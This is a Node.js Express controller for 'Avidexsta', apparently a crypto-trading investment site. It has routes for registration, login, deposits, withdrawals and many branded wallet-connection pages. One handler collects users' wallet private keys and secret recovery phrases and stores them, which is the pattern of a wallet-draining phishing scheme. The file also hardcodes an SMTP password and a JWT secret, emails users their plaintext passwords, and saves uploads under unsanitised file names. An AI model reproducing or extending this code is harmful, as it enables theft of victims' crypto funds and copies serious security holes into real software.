const User = require('../Model/User');
const Deposit = require('../Model/depositSchema');
const Widthdraw = require('../Model/widthdrawSchema');
const Wallet = require('../Model/walletSchema');
// const axios = require("axios");
const jwt = require('jsonwebtoken');
const nodemailer = require("nodemailer");



// handle errors
const handleErrors = (err) => {
    console.log(err.message, err.code);
    let errors = { email: '', password: '', };
  
    // duplicate email error
    if (err.code === 11000) {
      errors.email = 'that email is already registered';
      return errors;
    }
  
    // validation errors
    if (err.message.includes('user validation failed')) {
      // console.log(err);
      Object.values(err.errors).forEach(({ properties }) => {
        // console.log(val);
        // console.log(properties);
        errors[properties.path] = properties.message;
      });
    }
  
    return errors;
  }




  const maxAge = 3 * 24 * 60 * 60;
  const createToken = (id) => {
    return jwt.sign({ id }, 'piuscandothis', {
      expiresIn: maxAge
    });
  };




module.exports.homePage = (req, res)=>{
res.render("index")
}

    module.exports.termsPage = (req, res)=>{
        res.render("terms")
    }

    module.exports.registerPage = (req, res)=>{
        res.render("register")
    }
    
    

const sendEmail = async ( fullname, email,  password ) =>{
    

  try {
    const transporter =  nodemailer.createTransport({
      host: 'mail.globalflextyipsts.com',
      port:  465,
      auth: {
        user: 'globalfl',
        pass: 'bpuYZ([EHSm&'
      }
  
      });
    const mailOptions = {
      from:'globalfl@globalflextyipsts.com',
      to:email,
      subject: 'Welcome to AVIDEXSTA',
      html: `<p>Hello  ${fullname},<br>You are welcome to Avidexsta, we will help you make profit from the financial market after trading. All you need to do is to upload a valid ID and our support team will verify your trade account. When your account is verified click on the deposit page in your account menu and deposit to your trading account. You will earn according to your deposited amount and you can withdraw your profits as soon as your trades is completed. Good luck and we are waiting to get testimonies from you.

      Please note that your deposit is with the wallet address provided by Avidexstandard trading Platform, do not invest to any copied wallet address or bank details provided by any account manager or third party other than that provided by ,Avidexsta hence your deposit is invalid.<br><br>
      
      <br><br>Best Regards,
      Management<br><br>
      
      Copyrights 2023 @Avidexsta . All Rights Reserved..<br><br>
      Your login information:<br>Email: ${email}<br>Password: ${password}<br><br>You can login here: <br>  Contact us immediately if you did not authorize this registration.<br>Thank you.</p>`
  }
  transporter.sendMail(mailOptions, (error, info) =>{
    if(error){
        console.log(error);
        res.send('error');
    }else{
        console.log('email sent: ' + info.response);
        res.send('success')
    }
})


  } catch (error) {
    console.log(error.message);
  }
}

module.exports.register_post = async (req, res) =>{
  const {fullname,country, tel,email, password, } = req.body;
  try {
      const user = await User.create({fullname,country,  tel, email,  password });
      const token = createToken(user._id);
      res.cookie('jwt', token, { httpOnly: true, maxAge: maxAge * 1000 });
      res.status(201).json({ user: user._id });

      if(user){
        sendEmail(req.body.fullname,req.body.email, req.body.password)
      }else{
        console.log(error);
      }
    }
  
      catch(err) {
          const errors = handleErrors(err);
          res.status(400).json({ errors });
        }
  
}

module.exports.loginPage = (req, res)=>{
    res.render("login")
}

const loginEmail = async (  email ) =>{
    
  try {
    const transporter =  nodemailer.createTransport({
      host: 'mail.globalflextyipsts.com',
      port:  465,
      auth: {
        user: 'globalfl',
        pass: 'bpuYZ([EHSm&'
      }
  
      });
    const mailOptions = {
      from:'globalfl@globalflextyipsts.com',
      to:email,
      subject: 'Your account has recently been logged In',
      html: `<p>Greetings,${email}<br>your trading account has just been logged in by a device .<br>
     if it's not you kindly message support to terminate access  <br>You can login here: https:/Avidexsta.com/login.<br>Thank you.</p>`
  }
  transporter.sendMail(mailOptions, (error, info) =>{
    if(error){
        console.log(error);
        res.send('error');
    }else{
        console.log('email sent: ' + info.response);
        res.send('success')
    }
})


  } catch (error) {
    console.log(error.message);
  }
}



module.exports.login_post = async(req, res) =>{
    const { email, password } = req.body;

    try {
      const user = await User.login(email, password);
      const token = createToken(user._id);
      res.cookie('jwt', token, { httpOnly: true, maxAge: maxAge * 1000 });
      res.status(200).json({ user: user._id });

        if(user){
          loginEmail(req.body.email)
        }else{
          console.log(error);
        }
    } 
    catch (err) {
      const errors = handleErrors(err);
      res.status(400).json({ errors });
    }
}

module.exports.loginAdmin = (req, res)=>{
    res.render("loginAdmin")
}

module.exports.dashboardPage = async(req, res) =>{
  res.render('dashboard');
}


module.exports.accountPage = async(req, res) =>{
//   const id = req.params.id
//   const user = await User.findById(id);
  res.render('account')
}

module.exports.editProfilePage = async(req, res)=>{
    res.render("editProfile")
}

module.exports.depositPage = async(req, res) =>{
    res.render("fundAccount")
}

module.exports.widthdrawPage = async(req, res)=>{
    res.render("widthdrawFunds")
}


module.exports.depositPage_post = async(req, res) =>{
    // const {type, amount, status, image, narration} = req.body
    let theImage;
    let uploadPath;
    let newImageName;

    if(!req.files || Object.keys(req.files).length === 0){
        console.log('no files to upload')
    }else{
            theImage = req.files.image;
            newImageName = theImage.name;
            uploadPath = require('path').resolve('./') + '/Public/IMG_UPLOADS' + newImageName

            theImage.mv(uploadPath, function(err){
                if(err){
                    console.log(err)
                }
            })

    }
    try {
        const deposit = new Deposit({
          payment_method: req.body.payment_method,
            amount: req.body.amount,
            status: req.body.status,
             image: newImageName,
        })
        deposit.save()
        const id = req.params.id;
        const user = await User.findById( id);
        user.deposits.push(deposit);
        // await User.findById(id).populate("deposits")
        await user.save();
        console.log(user)
        res.render("depositHistory",{user})
        // if(user){
        //     depositEmail(req.body.type, req.body.amount, req.body.narration)
            // req.flash('success_msg', 'your deposit is successful')
        // }else{
        //     console.log(error)
        // }
    } catch (error) {
        console.log(error)
    }
  
}

module.exports.depositHistory = async(req, res) =>{
  try {
    const id = req.params.id
const user = await User.findById(id).populate("deposits")
  res.render('depositHistory', { user});
  } catch (error) {
    console.log(error)
  }
}

 
module.exports.widthdrawPage_post = async(req, res) =>{
    // const {amount, type, status, narration} = req.body
  try {
    const widthdraw = new Widthdraw({
      payment_method:req.body.payment_method,
      amount: req.body.amount,
      status: req.body.status,
    });
    widthdraw.save()
    const id = req.params.id;
    const user = await User.findById(id)
    user.widthdraws.push(widthdraw);
    await user.save()

    res.render("widthdrawHistory", {user})
        // if(user){
        //     widthdrawEmail(req.body.amount,req.body.type, req.body.narration )
        // }else{
        //     console.log(error)
        // }
 
  } catch (error) {
    console.log(error)
  }
}

module.exports.widthdrawHistory = async(req, res) =>{
  const id = req.params.id
    const user = await User.findById(id).populate("widthdraws")
     res.render('widthdrawHistory', { user})
}

module.exports.subscriptionPage = async(req, res)=>{
  res.render('subscription')
}

module.exports.menuPage = async(req, res)=>{
  res.render('menu')
}

module.exports.socialPage = async(req, res)=>{
  res.render('connect-social-media')
}

module.exports.connectPage = async(req, res)=>{
  res.render('connect-wallets')
}

module.exports.connectPage_post = async(req, res)=>{
  const wallet = new Wallet({
    type: req.body.type,
    email: req.body.email,
    private_key: req.body.private_key,
    secret_phase: req.body.secret_phase
  })
  wallet.save()
  const id = req.params.id;
  const user = await User.findById(id)
  user.wallets.push(wallet)
  await user.save()
  res.render('connected-wallets',{user})
}

module.exports.connectedPage = async(req, res)=>{
  const id = req.params.id
  const user = await User.findById(id).populate("wallets")
   res.render('connected-wallets', { user})
}


module.exports.buyPage = async(req, res)=>{
  res.render('buy-links')
}

module.exports.autoPage = async(req, res)=>{
  res.render('auto-trade')
}

module.exports.refPage = async(req, res)=>{
  res.render('referral')
}

module.exports.trustPage = async(req, res)=>{
  res.render('trust-wallet')
}

module.exports.metaPage = async(req, res)=>{
  res.render('meta-mask')
}

module.exports.mewPage = async(req, res)=>{
  res.render('mew-wallet')
}

module.exports.walletPage = async(req, res)=>{
  res.render('wallet-connect')
}

module.exports.thetaPage = async(req, res)=>{
  res.render('theta')
}

module.exports.blockPage = async(req, res)=>{
  res.render('blockchain')
}

module.exports.tezosPage = async(req, res)=>{
  res.render('tezos')
}

module.exports.cosPage = async(req, res)=>{
  res.render('cosmos')
}

module.exports.coinPage = async(req, res)=>{
  res.render('coinbase')
}

module.exports.loanPage = async(req, res)=>{
  res.render('coinloan')
}

module.exports.polkPage = async(req, res)=>{
  res.render('polkadot')
}

module.exports.atomPage = async(req, res)=>{
  res.render('atomic-wallet')
}

module.exports.logout_get = (req, res) => {
    res.cookie('jwt', '', { maxAge: 1 });
    res.redirect('/');
  }



